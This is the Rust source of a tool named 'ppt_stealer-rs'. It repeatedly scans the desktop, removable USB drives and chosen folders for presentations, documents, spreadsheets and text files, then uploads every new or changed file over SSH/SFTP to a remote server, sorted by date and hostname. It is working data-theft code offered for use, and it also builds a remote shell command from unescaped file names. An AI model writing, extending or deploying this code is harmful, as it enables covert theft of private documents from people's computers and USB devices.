use chrono::Local;
use clap::{ArgGroup, Args, Parser, ValueEnum};
use connection_tools::SshSessionGuard;
use env_logger;
use gethostname::gethostname;
use log;
use ssh2::Session;
use std::collections::HashMap;
use std::io::Read;
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::thread::sleep;
use std::time::Duration;
use std::{self, str::FromStr};
use std::{fs, io};
use sysinfo::Disks;

mod connection_tools;
mod watch_dog;

#[derive(Parser, Debug)]
#[command(name = "ppt_stealer-rs", version)]
#[command(about, long_about = None, author)]
#[command(color = clap::ColorChoice::Always)]
#[command(help_template = "\
{bin} {version} by {author-with-newline}{about}

{usage-heading} {usage}

{all-args}

{after-help}")]
#[command(group(
    ArgGroup::new("auth")
        .args(&["password", "key_auth"])
        .required(false)
        .multiple(false)
))]
struct Cli {
    #[arg(short = 'i', long, help = "SSH IP address or domain")]
    ip: Option<String>,

    #[arg(short = 'p', long, help = "SSH IP port")]
    port: Option<i64>,

    #[arg(short = 'u', long, help = "SSH username")]
    username: Option<String>,

    #[arg(short = 'P', long, group = "auth", help = "SSH password")]
    password: Option<String>,

    #[arg(
        long,
        default_value_t = false,
        group = "auth",
        next_line_help = true,
        help = "Use SSH key authentication. If not assigned, password authentication will be used."
    )]
    key_auth: bool,

    #[arg(long, default_value_t = 30, help = "Refresh interval in seconds")]
    refresh_interval: u64,

    #[arg(
        long,
        default_value_t = false,
        help = "Assign no GUI mode",
        default_value_t = true
    )]
    no_gui: bool,

    #[arg(long, help = "Scan additional folder for files.")]
    remote_folder_name: Option<String>,

    #[arg(long, help = "Scan USB for files.")]
    usb: bool,

    #[arg(
        value_enum,
        short = 'L',
        long,
        next_line_help = true,
        help = "Debug level.",
        default_value_t = DebugLevel::Info)]
    debug_level: DebugLevel,

    #[command(flatten)]
    scan_params: ScanParams,
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
enum DebugLevel {
    Trace,
    Debug,
    Info,
    Warn,
    Error,
}

#[derive(Args, Debug, Clone)]
#[group(required = false, multiple = true)]
struct ScanParams {
    #[arg(long, help = "Custimised desktop path")]
    desktop_path: Option<String>,

    #[arg(long, short = 'm', help = "Minimum depth of file (included)")]
    min_depth: Option<usize>,

    #[arg(long, short = 'M', help = "Maximum depth of file (included)")]
    max_depth: Option<usize>,

    #[arg(long, short = 'a', help = "Additional paths to scan")]
    add_paths: Option<Vec<String>>,

    #[arg(long, short = 'r', help = "Regex pattern to match files")]
    regex: Option<String>,

    #[arg(
        long,
        help = "Assign file formats",
        default_value = "ppt pptx odp doc docx odt xls xlsx ods csv txt md",
        value_delimiter = ' '
    )]
    formats: Vec<String>,
}

fn main() {
    // Parse command line arguments
    let args = Cli::parse();

    // set debug level
    std::env::set_var(
        "RUST_LOG",
        match args.debug_level {
            DebugLevel::Trace => "trace",
            DebugLevel::Debug => "debug",
            DebugLevel::Info => "info",
            DebugLevel::Warn => "warn",
            DebugLevel::Error => "error",
        },
    );
    env_logger::init();

    // Set up logging
    // print name and version
    println!(
        "{} {}, by {}\n{}",
        std::env!("CARGO_PKG_NAME"),
        std::env!("CARGO_PKG_VERSION"),
        std::env!("CARGO_PKG_AUTHORS"),
        std::env!("CARGO_PKG_DESCRIPTION")
    );
    // print args
    log::info!("Args: {:?}", args);

    // get desktop path
    let desktop_path = match args.scan_params.desktop_path.as_deref() {
        Some(path_string) => {
            let path = PathBuf::from_str(path_string).unwrap();
            match path.is_dir() {
                true => path,
                false => {
                    log::error!("An invalid directory path is assigned! {}", path_string);
                    std::process::exit(1);
                }
            }
        }
        None => match dirs::desktop_dir() {
            Some(path) => path,
            None => {
                // ask user for desktop path
                let mut path = String::new();
                std::io::stdin()
                    .read_line(&mut path)
                    .expect("Failed to read line");
                let path = PathBuf::from_str(path.trim()).unwrap();
                // check if the given desktop path is valid
                match path.is_dir() {
                    true => path,
                    false => {
                        log::error!("{} is invalid desktop path", path.display());
                        std::process::exit(1);
                    }
                }
            }
        },
    };
    log::info!("Desktop path: {}", desktop_path.display());

    if args.no_gui {
        no_gui(&desktop_path, &args);
    } else {
        // start GUI
        log::error!("GUI mode is still under development.");
    }
}

fn no_gui(desktop_path: &Path, args: &Cli) {
    log::info!("No GUI mode on.");

    let sess: Arc<Mutex<Session>> = Arc::new(Mutex::new(establish_ssh_connection(&args)));

    let _sess_guard = SshSessionGuard { session: &sess };

    // make sure ssh connection closed after Ctrl+C.
    ctrlc::set_handler({
        let sess = Arc::clone(&sess);
        move || {
            log::info!("Ctrl+C detected. Exiting...");
            let sess = sess.lock().unwrap();
            sess.disconnect(None, "CtrlC detected", None)
                .expect("Failed to disconnect from SSH server.");
            log::info!("SSH session closed.");
            std::process::exit(0);
        }
    })
    .expect("Error setting Ctrl+C handler.");

    // check customed paths and generate Path s
    let custom_paths: Option<Vec<PathBuf>> = match &args.scan_params.add_paths {
        Some(path_strings) => {
            let mut paths: Vec<PathBuf> = vec![];
            for path_string in path_strings.iter() {
                let path = PathBuf::from_str(path_string).unwrap();
                match path.is_dir() {
                    true => {
                        paths.push(path);
                    }
                    false => {
                        log::error!("{} is not an valid dir path!", path_string);
                        std::process::exit(1)
                    }
                }
            }
            Some(paths)
        }
        None => None,
    };

    log::info!("Start monitering files...");

    let mut file_hashes: HashMap<PathBuf, String> = HashMap::new();

    loop {
        // detect existing USB devices
        let mut disk_list = vec![];
        if args.usb {
            let disks = Disks::new_with_refreshed_list();

            for disk in disks.iter().filter(|d| d.is_removable()) {
                disk_list.push(disk.mount_point().to_str().unwrap().to_string());
            }
        }

        let mut root_of_paths_map: HashMap<PathBuf, PathBuf> = HashMap::new();

        // containing paths which shall be scanned.
        let mut target_dir_path_bufs: Vec<PathBuf> = vec![];

        log::info!("Scanning desktop files...");
        let mut temp_path_bufs: Vec<PathBuf> = watch_dog::file_moniter(
            desktop_path,
            &args.scan_params.formats,
            args.scan_params.regex.as_deref(),
            args.scan_params.min_depth,
            args.scan_params.max_depth,
        );

        target_dir_path_bufs.append(&mut temp_path_bufs);

        let cloned_path_bufs = target_dir_path_bufs.clone();

        for path in cloned_path_bufs.iter() {
            root_of_paths_map.insert(path.clone(), desktop_path.to_path_buf());
        }

        log::info!("Scanning usb files...");
        for disk in disk_list.iter() {
            let disk_path = Path::new(disk);
            let mut temp_path_bufs: Vec<PathBuf> = watch_dog::file_moniter(
                disk_path,
                &args.scan_params.formats,
                args.scan_params.regex.as_deref(),
                args.scan_params.min_depth,
                args.scan_params.max_depth,
            );
            for path in temp_path_bufs.iter() {
                root_of_paths_map.insert(path.clone(), disk_path.to_path_buf());
            }
            target_dir_path_bufs.append(&mut temp_path_bufs);
        }

        log::info!("Scanning customised paths...");
        if let Some(custom_paths) = &custom_paths {
            for custom_path in custom_paths.iter() {
                let temp_path_bufs: Vec<PathBuf> = watch_dog::file_moniter(
                    custom_path,
                    &args.scan_params.formats,
                    args.scan_params.regex.as_deref(),
                    args.scan_params.min_depth,
                    args.scan_params.max_depth,
                );
                for temp_path_buf in temp_path_bufs {
                    root_of_paths_map.insert(temp_path_buf.clone(), custom_path.to_path_buf());
                    target_dir_path_bufs.push(temp_path_buf);
                }
            }
        };

        let new_file_hashes = match watch_dog::get_hashes(&target_dir_path_bufs) {
            Ok(hashes) => hashes,
            Err(e) => {
                log::warn!(
                    "Error getting hashes: Maybe the file is removed? Error code: {}:",
                    e
                );
                continue;
            }
        };

        let changed_files: Vec<PathBuf> =
            watch_dog::get_changed_files(&file_hashes, &new_file_hashes);

        if changed_files.len() > 0 {
            log::info!("Changed files detected.");

            log::debug!("Changed files: {:?}", changed_files);

            file_hashes = new_file_hashes;

            log::info!("Uploading changed files...");

            let files_and_roots_path = {
                let mut files_and_roots_path: Vec<[&Path; 2]> = vec![];
                for path in changed_files.iter() {
                    log::debug!("Get root path of {}", path.display());
                    let root_path = match root_of_paths_map.get(path.as_path()) {
                        Some(path) => path,
                        None => {
                            log::warn!(
                                "Failed to find the root of {} from the dict!
                                There must be vulnerability in the code. Please
                                create an issue for the project. Now assume it to
                                be empty.",
                                path.display()
                            );
                            Path::new("")
                        }
                    };
                    files_and_roots_path.push([&path, root_path]);
                }
                files_and_roots_path
            };

            upload_files(&files_and_roots_path, &sess, &args.remote_folder_name);

            log::info!("Upload completed.");
        } else {
            log::info!("No changes detected.");
        }

        sleep(Duration::from_secs(args.refresh_interval));
    }
}

fn establish_ssh_connection(args: &Cli) -> Session {
    log::info!("Connecting to SSH server...");

    let tcp = {
        let ip = args
            .ip
            .as_ref()
            .expect("On no GUI mode, SSH IP address is required!");
        let port = args.port.unwrap_or_else(|| 22);

        let addr = format!("{}:{}", ip, port);

        log::info!("Connecting to SSH server: {}", addr);

        match TcpStream::connect(addr) {
            Ok(stream) => stream,
            Err(e) => {
                log::error!("Failed to connect to SSH server: {}", e);
                std::process::exit(1);
            }
        }
    };
    log::info!("Established tcp connection with SSH server.");

    log::info!("Starting SSH session...");
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();
    if args.key_auth {
        let private_key_path = dirs::home_dir().unwrap().join(".ssh/id_rsa");
        log::debug!(
            "Authenticating with rivate key: {}",
            private_key_path.display()
        );

        sess.userauth_pubkey_file(
            args.username
                .as_ref()
                .expect("On no GUI mode, SSH username is required!"),
            None,
            &private_key_path,
            None,
        )
        .expect("Failed to authenticate with SSH key.");
    } else {
        sess.userauth_password(
            args.username
                .as_ref()
                .expect("On no GUI mode, SSH username is required!"),
            args.password
                .as_ref()
                .expect("On no GUI mode, SSH password is required!"),
        )
        .expect("Failed to authenticate with SSH password.");
    }
    assert!(sess.authenticated());
    log::info!("SSH Authentication successful.");

    sess
}

/**
   Upload files to `YYYY-MM-DD/remote_folder_name` if `remote_folder_name` is not `None`.

   ## Args
   ### changed_files:
   It is a reference to a vector of tuples, where each tuple contains two elements:
   - The first element is the &Path of the file on the local machine.
   - The second is the path of the root folder, by which a relative path is calculated.
   With the relative path, a directory is created on the remote machine,
   and the file is uploaded to that directory.
   ### sess:
   Shared SSH session.
   ### remote_folder_name:
   Customised remote folder name. Optional.
*/
fn upload_files(
    files_and_roots_path: &[[&Path; 2]],
    sess: &Arc<Mutex<Session>>,
    remote_folder_name: &Option<String>,
) {
    // establish sftp session
    let sess = sess.lock().unwrap();
    let sftp = { sess.sftp().unwrap() };
    log::info!("SFTP session established.");

    // create a remote folder for this computer and the date.
    let remote_folder_name = {
        match remote_folder_name {
            Some(name) => name.clone(),
            None => {
                let formatted_date = Local::now().format("%Y-%m-%d").to_string();

                let computer_identifier = match gethostname().to_str() {
                    Some(name) => name.to_string(),
                    None => {
                        let home_dir = dirs::home_dir().unwrap();
                        home_dir.file_name().unwrap().to_str().unwrap().to_string()
                    }
                };

                let remote_folder_name = format!("{}/{}", formatted_date, computer_identifier);
                log::debug!(
                    "Remote folder name for this computer defined as: {remote_folder_name}"
                );

                remote_folder_name
            }
        }
    };

    for [file_path, root_path] in files_and_roots_path.iter() {
        let root_path_parent = match root_path.parent() {
            Some(parent) => parent,
            None => Path::new(root_path.to_str().unwrap()),
        };
        log::debug!(
            "Stripping prefix of file path {} by root path {}",
            file_path.display(),
            root_path_parent.display()
        );
        let relative_path = file_path
            .strip_prefix(root_path_parent)
            .expect("Failed to strip prefix.");
        let relative_path = match root_path.parent() {
            Some(_) => file_path
                .strip_prefix(root_path_parent)
                .expect("Failed to strip prefix.")
                .to_path_buf(),
            None => Path::new(&root_path_parent.to_str().unwrap()[0..1]).join(relative_path),
        };

        let remote_path_string =
            format!("{}/{}", remote_folder_name, relative_path.to_str().unwrap());
        let remote_path = Path::new(&remote_path_string);

        log::info!(
            "Uploading file: {} to remote folder: {}",
            relative_path.display(),
            remote_path.display()
        );

        // check if the remote folder exists. If not, create it.
        {
            let remote_path_dirpath = remote_path.parent().unwrap();
            if sftp.stat(remote_path_dirpath).is_ok() {
                log::debug!(
                    "Remote folder '{}' already exists.",
                    remote_path_dirpath.display()
                );
            } else {
                loop {
                    if sftp.stat(remote_path_dirpath).is_ok() {
                        log::debug!(
                            "Remote folder '{}' already exists.",
                            remote_path_dirpath.display()
                        );
                        break;
                    }
                    let mut temp_path = remote_path_dirpath;
                    loop {
                        let parent_folder = temp_path.parent().unwrap();
                        if sftp.stat(parent_folder).is_ok() {
                            log::debug!(
                                "Remote folder '{}' already exists.",
                                parent_folder.display()
                            );
                            log::debug!("Creating remote folder '{}'.", temp_path.display());
                            sftp.mkdir(temp_path, 0o755)
                                .expect("Failed to create remote folder.");
                            log::debug!("Remote folder '{}' created.", temp_path.display());
                            break;
                        } else if parent_folder.to_str().unwrap() == "" {
                            log::debug!(
                                "There is no parent folder of '{}'.Just create it",
                                temp_path.display()
                            );
                            log::debug!("Creating remote folder '{}'.", temp_path.display());
                            sftp.mkdir(temp_path, 0o755)
                                .expect("Failed to create remote folder.");
                            log::debug!("Remote folder '{}' created.", temp_path.display());
                            break;
                        } else {
                            log::debug!(
                                "Remote folder '{}' does not exist.",
                                parent_folder.display()
                            );
                            temp_path = parent_folder;
                        }
                    }
                }
            }
        }

        // upload file
        log::info!(
            "Uploading {} to {}",
            file_path.display(),
            remote_path.display()
        );

        // if remote file exists, check if the two files are the same.
        log::debug!("Comparing local and remote file.");
        {
            if sftp.stat(remote_path).is_ok() {
                // get remote hash
                let mut channel = sess.channel_session().unwrap();
                let cmd = format!(
                    "sha256sum '{}' | awk '{{print $1}}'",
                    remote_path.to_str().unwrap().replace("\\", "/")
                );
                log::debug!("Executing command: '{}'", cmd);
                channel.exec(&cmd).unwrap();

                let mut remote_hash = String::new();
                channel
                    .read_to_string(&mut remote_hash)
                    .expect("Failed to read remote operation result.");
                remote_hash = remote_hash.trim().to_string();

                channel.wait_close().unwrap();

                match channel.exit_status() {
                    Ok(0) => {
                        log::debug!(
                            "Hash of remote file {} is {}",
                            remote_path.display(),
                            remote_hash
                        )
                    }
                    Ok(code) => {
                        log::warn!(
                            "Failed to get hash of remote file: Maybe false syntax? Error code: {}",
                            code
                        );
                        continue;
                    }
                    Err(err) => {
                        log::warn!("Failed to get hash of remote file: Maybe connection lost? Error info: {}", err);
                        continue;
                    }
                }

                // get local hash
                let local_hash = match watch_dog::get_file_sha256(file_path) {
                    Ok(hash) => {
                        log::debug!("Hash of local file {} is {}", file_path.display(), hash);
                        hash
                    }
                    Err(err) => {
                        log::warn!("Failed to get hash of local file {}: Maybe the file is removed? Error info: {}", file_path.display(), err);
                        continue;
                    }
                };

                // compare hashes
                if remote_hash == local_hash {
                    log::info!(
                        "Remote file {} is the same as local file {}, skip uploading.",
                        remote_path.display(),
                        file_path.display()
                    );
                    continue;
                } else {
                    log::info!(
                        "Remote file {} is different from local file {}, uploading.",
                        remote_path.display(),
                        file_path.display()
                    );
                }
            }
        }

        // open local file
        log::trace!("Opening local file {}", file_path.display());
        let mut local_file = match fs::File::open(file_path) {
            Ok(file) => file,
            Err(err) => {
                log::warn!(
                    "Failed to open local file {}: Maybe the file is removed? Error info: {}",
                    file_path.display(),
                    err
                );
                continue;
            }
        };

        // open remote file
        log::trace!("Opening remote file {}", remote_path.display());
        let mut remote_file = match sftp.create(remote_path) {
            Ok(file) => file,
            Err(err) => {
                log::warn!(
                    "Failed to create remote file {}: Maybe connection lost? Error  {}",
                    remote_path.display(),
                    err
                );
                continue;
            }
        };

        // copy file
        match io::copy(&mut local_file, &mut remote_file) {
            Ok(_) => {
                log::info!(
                    "Uploaded {} to {} successfully.",
                    file_path.display(),
                    remote_path.display()
                );
            }
            Err(err) => {
                log::warn!(
                    "Failed to upload local file {} to remote path {}: Maybe connection lost or permission denied? Error info: {}",
                    file_path.display(), remote_path.display(),
                    err
                );
                continue;
            }
        };
    }
    log::info!("Finished uploading files.");
}
